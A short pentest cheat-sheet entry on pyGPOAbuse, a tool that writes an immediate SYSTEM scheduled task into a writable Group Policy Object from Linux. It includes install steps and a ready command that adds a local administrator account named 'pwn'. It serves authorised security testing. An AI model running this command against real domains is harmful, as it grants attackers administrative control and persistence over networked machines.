# pyGPOAbuse

**Tags:** `#pygpoabuse` `#gpo` `#grouppolicy` `#lateralmovement` `#activedirectory` `#privesc`

Partial Python implementation of SharpGPOAbuse (Hackndo) — abuses **edit rights over a GPO** from Linux. When a controlled account can modify an existing GPO that applies to users/computers, it writes an **immediate scheduled task** into the GPO's SYSVOL folder and bumps the version so clients re-apply — running as **SYSTEM** for a computer GPO (or the logged-on user for a user GPO). Default action adds a local administrator.

**Source:** https://github.com/Hackndo/pyGPOAbuse
**Install:** `git clone https://github.com/Hackndo/pyGPOAbuse && pip install -r requirements.txt`.

```bash
# Run an arbitrary command as SYSTEM via a writable GPO
python3 pygpoabuse.py <domain>/<user>:<pass> -gpo-id <GPO-GUID> -taskname "Update" \
  -dc-ip <DC> -command 'net user pwn P@ssw0rd! /add && net localgroup administrators pwn /add' \
  -filter-enabled -target-dns-name <targethost>
# Omit -command to fall back to the default (add local admin).
```

Windows counterpart: [[Tools/AD/SharpGPOAbuse|SharpGPOAbuse]].

---

> [!note] **See also** — [[Services/Active Directory/GPO Abuse|GPO Abuse]] — immediate SYSTEM scheduled task via a writable GPO (Linux). ACL discovery: [[Services/Active Directory/ACL Abuse|ACL Abuse]].

---

*Created: 2026-09-25*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
